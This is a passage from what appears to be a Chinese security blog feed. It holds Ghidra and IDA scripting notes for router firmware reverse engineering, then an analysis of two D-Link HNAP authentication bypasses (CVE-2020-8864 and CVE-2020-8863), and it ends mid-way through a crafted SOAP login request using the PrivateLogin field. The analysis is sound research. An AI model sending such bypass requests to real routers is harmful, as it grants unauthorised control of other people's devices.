%s"</span> %(old_name, str(arg_list)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        rename_func_dict[old_name] = &#123;</span><br><span class="line">            <span class="string">"new_name"</span>: new_name,</span><br><span class="line">            <span class="string">"caller_addr"</span>: caller_addr</span><br><span class="line">        &#125;</span><br><span class="line">        logger.debug(<span class="string">"new_name: %s , caller_addr: 0x%x"</span> %(old_name, caller_addr.getOffset()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3 rename</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"rename %d functions by %s"</span> % (len(rename_func_dict), func_name))</span><br><span class="line">    <span class="keyword">for</span> old_name, rename_info <span class="keyword">in</span> rename_func_dict.items():</span><br><span class="line">        new_name = rename_info[<span class="string">'new_name'</span>]</span><br><span class="line">        caller_addr = rename_info[<span class="string">'caller_addr'</span>]</span><br><span class="line">        <span class="comment"># getFunction(old_name).setName(new_name, USER_DEFINED)#here</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\t&#123;:#x&#125; in &#123;:20s&#125;  new_name: &#123;&#125;"</span>.format(caller_addr.getOffset(), old_name, new_name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="02-get-func-caller-py"><a href="#02-get-func-caller-py" class="headerlink" title="02-get_func_caller.py"></a>02-get_func_caller.py</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get function caller using P-Code.</span></span><br><span class="line"><span class="comment"># tplink-archer-c5-v4-httpd.</span></span><br><span class="line"><span class="comment"># @author lxl</span></span><br><span class="line"><span class="comment"># @category my_python_script</span></span><br><span class="line"><span class="comment"># @keybinding</span></span><br><span class="line"><span class="comment"># @menupath</span></span><br><span class="line"><span class="comment"># @toolbar</span></span><br><span class="line"></span><br><span class="line">from tool import get_caller_dict, get_arg_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 1 find func</span></span><br><span class="line">    <span class="comment"># target_func_name = askLong("input", "function name")</span></span><br><span class="line">    target_func_name = <span class="string">"cdbg_printf"</span></span><br><span class="line">    target_func = 0</span><br><span class="line">    fm = currentProgram.getFunctionManager()</span><br><span class="line">    funcs = fm.getFunctions(True)</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> funcs:</span><br><span class="line">        <span class="keyword">if</span> func.getName() != target_func_name:</span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        target_func = func</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n1: find %s at 0x%s"</span> % (target_func_name, target_func.getEntryPoint()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2 get args</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"2: get args"</span>)</span><br><span class="line">    caller_dict = get_caller_dict(target_func)</span><br><span class="line">    caller_index = 0</span><br><span class="line">    <span class="keyword">for</span> caller_addr, caller_info <span class="keyword">in</span> caller_dict.items():</span><br><span class="line">        args_str = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(caller_info[<span class="string">'args'</span>])):</span><br><span class="line">            arg_value = get_arg_value(caller_info[<span class="string">'args'</span>], i + 1)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(arg_value) == long:</span><br><span class="line">                arg_value = hex(arg_value)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">type</span>(arg_value) == str:</span><br><span class="line">                arg_value = repr(arg_value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                arg_value = <span class="string">"Unknown"</span></span><br><span class="line">            args_str += <span class="string">"%s, "</span> % arg_value</span><br><span class="line"></span><br><span class="line">        <span class="comment"># only xxx</span></span><br><span class="line">        <span class="comment"># if "%s" not in args_str:</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line"></span><br><span class="line">        caller_index += 1</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\t&#123;:3d&#125;: &#123;:#x&#125; in &#123;:20s&#125;\t&#123;&#125;(&#123;&#125;)"</span>.format(caller_index, caller_addr.offset, caller_info[<span class="string">'caller_func'</span>], target_func_name, args_str.strip(<span class="string">", "</span>)))</span><br></pre></td></tr></table></figure>
<h2 id="03-trace-func-java"><a href="#03-trace-func-java" class="headerlink" title="03-trace_func.java"></a>03-trace_func.java</h2><ul>
<li>见文件</li>
</ul>
<h2 id="04-其它"><a href="#04-其它" class="headerlink" title="04-其它"></a>04-其它</h2><ul>
<li>window-python，python命令行窗口，光标放在反编译窗口C语句上（必须放在C语句上）</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反汇编</span></span><br><span class="line">0040bd74     jalr       t9=&gt;cdbg_printf                                  undefined cdbg_printf()</span><br><span class="line"><span class="comment"># 反编译</span></span><br><span class="line">cdbg_printf(8,<span class="string">"http_rpm_confburn"</span>,0xf6,<span class="string">"Detach big buffer error\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp<span class="comment"># 获取pcode</span></span><br><span class="line"> ---  CALL (ram, 0x4187a0, 8) , (const, 0x8, 4) , (unique, 0x1000001e, 4) , (const, 0xf6, 4) , (unique, 0x1000001a, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2)<span class="comment"># getInput函数可以方便的获取P-Code的input参数</span></span><br><span class="line">(unique, 0x1000001e, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2).getDef()<span class="comment"># 通过调用VarNode的getDef函数来对该VarNode的赋值流进行追踪</span></span><br><span class="line">(unique, 0x1000001e, 4) COPY (const, 0x41c564, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2).PCAddress<span class="comment"># PCAddress表示当前pcode对应的反汇编中指令地址</span></span><br><span class="line">0040bd74</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(2).getPCAddress()<span class="comment"># PCAddress等价getPCAddress()，最好函数形式</span></span><br><span class="line">0040bd74</span><br></pre></td></tr></table></figure>
<ul>
<li>同一个函数内，可能会有多个log输出函数，故不好确定函数名</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">void FUN_0041573c(char **param_1)</span><br><span class="line">&#123;</span><br><span class="line">    cdbg_printf(8,<span class="string">"findDynDomainName"</span>,0x3fe,<span class="string">"Falied to get DYN_DNS_CFG_OBJ"</span>);</span><br><span class="line">		cdbg_printf(8,<span class="string">"findWanIp"</span>,uVar4,pcVar5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>取字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># "isValidIp"位于0041a0a0</span></span><br><span class="line">0041a09a     ds         <span class="string">"\r\r\r\r\r\risValidIp"</span></span><br><span class="line">cdbg_printf(8,<span class="string">"isValidIp"</span>,uVar2,<span class="string">"Error ocurrs in convertint the IPs to num format!"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 跳过偏移则无结果</span></span><br><span class="line">&gt;&gt;&gt; getDataAt(toAddr(0x41a09a))<span class="comment"># 有结果</span></span><br><span class="line">ds <span class="string">"\r\r\r\r\r\risValidIp"</span></span><br><span class="line">&gt;&gt;&gt; getDataAt(toAddr(0x41a0a0))<span class="comment"># 空</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因此取字符串时，多加一个or</span></span><br><span class="line"><span class="keyword">if</span> getDataAt(arg_addr) or chr(currentProgram.getMemory().getByte(arg_addr)):</span><br><span class="line">    arg_value = get_string_by_addr(arg_addr)</span><br></pre></td></tr></table></figure>
<ul>
<li>输出的函数名/地址，两侧要有空格，才能点击跳转</li>
<li>import tool：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tool中需导入__main__</span></span><br><span class="line"><span class="comment"># from __main__ import *</span></span><br><span class="line">The Python module that Ghidra directly launches is always called __main__.  If we import</span><br><span class="line">everything from that module, this module will behave as <span class="keyword">if</span> Ghidra directly launched it.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 否则报错</span></span><br><span class="line">NameError: global name <span class="string">'getReferencesTo'</span> is not defined</span><br><span class="line"></span><br><span class="line"><span class="comment"># 都放在一个主文件中不需要，只有在import tool时，tool中需要导入</span></span><br></pre></td></tr></table></figure>
<ul>
<li>地址与地址对象的转换：addr_obj = toAddr(addr), addr = addr_obj.offset</li>
<li>获取pcode所在地址</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#         </span></span><br><span class="line">004a4860     jalr       t9=&gt;util_execSystem</span><br><span class="line">util_execSystem(<span class="string">"setRule"</span>,acStack568);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(0).PCAddress</span><br><span class="line">004a4860</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2（</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getSeqnum().getTarget()</span><br><span class="line">004a4860</span><br></pre></td></tr></table></figure>
<ul>
<li>遍历函数内pcode时</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二者同效果，monitor是啥？</span></span><br><span class="line"><span class="keyword">while</span> ops.hasNext() and ~monitor.isCancelled():</span><br><span class="line"><span class="keyword">while</span> ops.hasNext():</span><br></pre></td></tr></table></figure>
<ul>
<li>pcode获取，python代码与其它二者不同</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 地址004a4860</span></span><br><span class="line">004a4860     jalr       t9=&gt;util_execSystem</span><br><span class="line">util_execSystem(<span class="string">"setRule"</span>,acStack568);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行</span></span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp</span><br><span class="line"> ---  CALL (ram, 0x4835d0, 8) , (unique, 0x10000085, 4) , (register, 0x14, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getSeqnum().getTarget()</span><br><span class="line">004a4860</span><br><span class="line"></span><br><span class="line"><span class="comment"># java代码</span></span><br><span class="line">Call @ 0x4a4860 [oal_fw6_delRule] to 0x4835d0 [util_execSystem] (3 pcodeops)</span><br><span class="line">	 ---  CALL (ram, 0x4835d0, 8) , (unique, 0x10000085, 4) , (register, 0x14, 4) </span><br><span class="line">	Parameter <span class="comment">#0 - (ram, 0x4835d0, 8) @ 0x4835d0</span></span><br><span class="line">	Parameter <span class="comment">#1 - (unique, 0x10000085, 4) @ 0x10000085</span></span><br><span class="line">	Parameter <span class="comment">#2 - (register, 0x14, 4) @ 0x14</span></span><br><span class="line">	</span><br><span class="line"><span class="comment"># python代码    </span></span><br><span class="line">Debug 3:  ---  CALLIND (register, 0x64, 4) , (register, 0x10, 4) , (register, 0x14, 4)</span><br><span class="line">Debug 4: 004a4860</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原因：要对dec_lib进行设置，不可默认</span></span><br><span class="line">旧：dec_lib = DecompInterface()</span><br><span class="line">新：dec_lib = setup_decompiler(currentProgram)</span><br><span class="line">def setup_decompiler(program):</span><br><span class="line">    decomp_interface = DecompInterface()</span><br><span class="line">    options = DecompileOptions()</span><br><span class="line">    tool = state.getTool()</span><br><span class="line">    <span class="keyword">if</span> tool:</span><br><span class="line">        service = tool.getService(OptionsService)</span><br><span class="line">        <span class="keyword">if</span> service:</span><br><span class="line">            opt = service.getOptions(<span class="string">"Decompiler"</span>)</span><br><span class="line">            options.grabFromToolAndProgram(None, opt, program)</span><br><span class="line"></span><br><span class="line">    decomp_interface.setOptions(options)</span><br><span class="line">    decomp_interface.toggleCCode(True)</span><br><span class="line">    decomp_interface.toggleSyntaxTree(True)</span><br><span class="line">    decomp_interface.setSimplificationStyle(<span class="string">"decompile"</span>)</span><br><span class="line">    <span class="built_in">return</span> decomp_interface</span><br><span class="line"><span class="comment"># 新结果</span></span><br><span class="line">Debug 3:  ---  CALL (ram, 0x4835d0, 8) , (unique, 0x10000085, 4) , (register, 0x14, 4)</span><br><span class="line">Debug 4: 004a4860</span><br></pre></td></tr></table></figure>
<ul>
<li>导入<ul>
<li>java：import ghidra.app.decompiler.DecompInterface;</li>
<li>python：from ghidra.app.decompiler import DecompInterface</li>
</ul>
</li>
<li>varnode：const</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0)</span><br><span class="line">(const, 0x4c1460, 4)</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).isConstant()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).getAddress()<span class="comment"># 16进制</span></span><br><span class="line">const:004c1460</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).getOffset()<span class="comment"># 10进制</span></span><br><span class="line">4985952L</span><br><span class="line">&gt;&gt;&gt; currentLocation.token.pcodeOp.getInput(1).getDef().getInput(0).getDef()<span class="comment"># 常数，没法再向上追溯定义</span></span><br></pre></td></tr></table></figure>
<ul>
<li>todo<ul>
<li>get_func_pcode只保存调用目标函数的（python版）</li>
<li>怎么区分数值8与字符串地址//here</li>
</ul>
</li>
</ul>
<h1 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h1><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><ul>
<li>官网：<a href="https://hex-rays.com/products/ida/support/idadoc/162.shtml" target="_blank" rel="noopener">https://hex-rays.com/products/ida/support/idadoc/162.shtml</a></li>
<li><p>文件：ida_dir/idc/idc.idc</p>
<h2 id="create-function-py"><a href="#create-function-py" class="headerlink" title="create_function.py"></a>create_function.py</h2></li>
<li><p>from：笔记12-Reverse Engineering VxWorks Firmware: WRT54Gv8</p>
</li>
<li>原理：找函数序言<ul>
<li>遍历代码，查找函数序言来定位未标识的函数，如果找到一个，告诉IDA在那里创建一个函数</li>
<li>MIPS比Intel要复杂一些，因为函数序言在MIPS中没有那么标准化</li>
<li>在代码（从光标位置开始）中搜索与这些指令（函数序言）对应的字节序列，并指示IDA将它们转换为函数。</li>
</ul>
</li>
<li><p>常见序言：见note-汇编指令-mips-函数序言</p>
</li>
<li><p>起始地址/停止地址</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 起始地址：光标位置开始</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在反汇编中，包含字符串的数据部分似乎从0x802DDAC0开始，因此将其设为停止地址</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># End of function sub_802DDA64</span></span><br><span class="line">ROM:802DDAB4  <span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line">ROM:802DDAB8                 .word 0</span><br><span class="line">ROM:802DDABC                 .word 0</span><br><span class="line">ROM:802DDAC0 aInvalidConfigu:.ascii <span class="string">"Invalid configuration. PCI_MAX_DEV &gt; 16, PCI mechanism #2\n"</span>&lt;0&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接拉到最后，找最后的地址</span></span><br><span class="line">ROM:80383A5E                 .byte    0</span><br><span class="line">ROM:80383A5F                 .byte    0</span><br><span class="line">ROM:80383A5F</span><br><span class="line">ROM:80383A5F                  <span class="comment"># end</span></span><br></pre></td></tr></table></figure>
<h2 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如何将一堆数据转为有意义的结构体数组：创建结构体、选择结构体、转为array</span></span><br><span class="line"><span class="comment"># 1 创建结构体</span></span><br><span class="line">00000000 struc_label     struc ; (sizeof=0xC, mappedto_50)</span><br><span class="line">00000000                                         ; XREF: .data:label_tab/r</span><br><span class="line">00000000 index           DCD ?                   ; XREF: sa_parseRcvCmd+150/r</span><br><span class="line">00000004 string          DCD ?                   ; XREF: sa_parseRcvCmd+80/r</span><br><span class="line">00000004                                         ; sa_parseRcvCmd+330/r ; offset (00000000)</span><br><span class="line">00000008 <span class="built_in">type</span>            DCD ?                   ; XREF: sa_parseRcvCmd+88/r</span><br><span class="line">00000008                                         ; sa_parseRcvCmd+338/r</span><br><span class="line">0000000C struc_label     ends</span><br><span class="line"><span class="comment"># 2 结构体数组开始处，即第一个结构体处，alt+q：choose a structure type</span></span><br><span class="line"><span class="comment"># 3 同样开始处，shift+*或右键array，输入array size（大小自己控制</span></span><br><span class="line"><span class="comment"># 4 数组大小自己控制，比如400后，后续一些数据明显不对，有203行错误，故修正为197行</span></span><br><span class="line"><span class="comment"># 5 修正后（注意，地址都变成了数组首地址</span></span><br><span class="line">.data:0007DA44 label_tab       struc_label &lt;0xFF00, aNewenable, 1&gt;</span><br><span class="line">.data:0007DA44                                         ; DATA XREF: sub_1156C+30↑o</span><br><span class="line">.data:0007DA44                                         ; sub_1156C+68↑o ...</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF01, aNewconnectiont, 0x10&gt; ; <span class="string">"NewNTPServer1"</span> ...</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF02, aNewisploginnam, 0x40&gt;</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF03, aNewisppassword, 0x40&gt;</span><br><span class="line">.data:0007DA44                 struc_label &lt;0xFF04, aNewidletimer, 3&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 为何会显示这样？怎么显示字符串和函数名</span></span><br><span class="line">.data.rel.ro:004584C8 cgi_tbl:        my_struct1 &lt;0x444148, 0x422C40, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                                          <span class="comment"># DATA XREF: LOAD:00400FEC↑o</span></span><br><span class="line">.data.rel.ro:004584C8                                          <span class="comment"># init_global+268↑o ...</span></span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x43FE94, 0x4188E0, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x444154, 0x423DB8, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x444160, 0x423B80, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x44416C, 0x425120, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x44417C, 0x4270DC, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x444190, 0x424A24, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441A4, 0x429548, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441B8, 0x41983C, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441CC, 0x42A0FC, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441E4, 0x423438, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1 &lt;0x4441F0, 0x4231AC, 0x36B0, 0&gt;</span><br><span class="line">.data.rel.ro:004584C8                 my_struct1  &lt;0&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link两个认证绕过漏洞的分析</title>
    <url>/2021/07/13/iot/D-Link%E4%B8%A4%E4%B8%AA%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="D-Link两个认证绕过漏洞的分析"><a href="#D-Link两个认证绕过漏洞的分析" class="headerlink" title="D-Link两个认证绕过漏洞的分析"></a>D-Link两个认证绕过漏洞的分析</h1><h2 id="01-HNAP简介"><a href="#01-HNAP简介" class="headerlink" title="01-HNAP简介"></a>01-HNAP简介</h2><ul>
<li>Home Network Administration Protocol，家庭网络管理协议</li>
<li>基于SOAP的协议</li>
<li>被认为是UPnP的直接竞争对手</li>
<li>该协议的主要用户是Cisco和D-Link，两者都分别在2012年和<a href="https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10066" target="_blank" rel="noopener">2016年</a>停止使用此协议</li>
<li>此功能通常在管理面板中隐藏，因此无法禁用</li>
<li>一种过时的专有协议：如果您的路由器仍支持HNAP，则可能意味着您的路由器需要升级</li>
<li>HNAP提供两种类型的身份验证方案：Basic and HMAC-based</li>
<li>基于HMAC的身份验证方案：<a href="https://github.com/bikerp/dsp-w215-hnap/wiki/Authentication-process" target="_blank" rel="noopener">https://github.com/bikerp/dsp-w215-hnap/wiki/Authentication-process</a></li>
</ul>
<h2 id="02-HNAP认证过程"><a href="#02-HNAP认证过程" class="headerlink" title="02-HNAP认证过程"></a>02-HNAP认证过程</h2><ol start="0">
<li><p>认证需要两次请求/响应：Authentication to the server (router) requires two transactions. </p>
</li>
<li><p>客户端发送Action为<code>request</code>的请求</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Login</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Action</span>&gt;</span>request<span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LoginPassword</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Captcha</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端返回三个值： <code>Challenge</code>, <code>Cookie</code> and <code>PublicKey</code></p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LoginResponse</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LoginResult</span>&gt;</span>OK<span class="tag">&lt;/<span class="name">LoginResult</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Challenge</span>&gt;</span>rEmNZG3LUDFUSMJHU55P<span class="tag">&lt;/<span class="name">Challenge</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Cookie</span>&gt;</span>uidpiK0+<span class="tag">&lt;/<span class="name">Cookie</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PublicKey</span>&gt;</span>vq1w3gFhoIAlc38rEVLO<span class="tag">&lt;/<span class="name">PublicKey</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BackOff</span>&gt;</span>0<span class="tag">&lt;/<span class="name">BackOff</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LoginResponse</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端发送Action为<code>login</code>的请求：PublicKey+用户密码=PrivateKey、PrivateKey+Challenge=new_value（LoginPassword字段中</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Login</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Action</span>&gt;</span>login<span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LoginPassword</span>&gt;</span>new_value<span class="tag">&lt;/<span class="name">LoginPassword</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Captcha</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端验证：对比<code>LoginPassword</code>是否一致（自己计算的和客户端提供的</p>
</li>
</ol>
<h2 id="03-CVE-2020-8864认证绕过"><a href="#03-CVE-2020-8864认证绕过" class="headerlink" title="03-CVE-2020-8864认证绕过"></a>03-CVE-2020-8864认证绕过</h2><ul>
<li>位置：通过<code>strncmp</code>函数来对比<code>LoginPassword</code>时（服务端自己计算的、客户端提供的</li>
<li>代码：<code>strncmp( db_password, attacker_provided_password, strlen(attacker_provided_password));</code></li>
<li>正常逻辑：对比成功，返回0，则认证成功</li>
<li>漏洞逻辑：<ul>
<li>attacker_provided_password为空字符串，<code>strlen()</code> 返回0</li>
<li>strncmp的第三个参数为0时，其不比较任何字符，直接返回0</li>
<li>strncmp：认证成功返回0，空字符串也0，绕过</li>
</ul>
</li>
</ul>
<h2 id="04-CVE-2020-8863认证绕过"><a href="#04-CVE-2020-8863认证绕过" class="headerlink" title="04-CVE-2020-8863认证绕过"></a>04-CVE-2020-8863认证绕过</h2><ul>
<li>漏洞描述：<ul>
<li>D-Link Multiple Routers HNAP PrivateLogin Incorrect Implementation of Authentication Algorithm Authentication Bypass Vulnerability</li>
<li>关键字：PrivateLogin</li>
</ul>
</li>
<li>PrivateKey的生成<ul>
<li>正常认证过程：第二次action为login的请求中，PublicKey+用户密码=PrivateKey</li>
<li>异常：如果在第一次action为request的请求中，提供<code>&lt;PrivateLogin&gt;</code>字段，那么PublicKey+用户名=PrivateKey</li>
</ul>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Login</span> <span class="attr">xmlns</span>=<span class="string">"http://purenetworks.com/HNAP1/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Action</span>&gt;</span>request<span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Username</span>&gt;</span>Admin<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LoginPassword</span>&gt;</span><span class="tag">&lt;/<span class="name">LoginPassword</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PrivateLogin</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">PrivateLogin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Captcha</span>&gt;</span><span 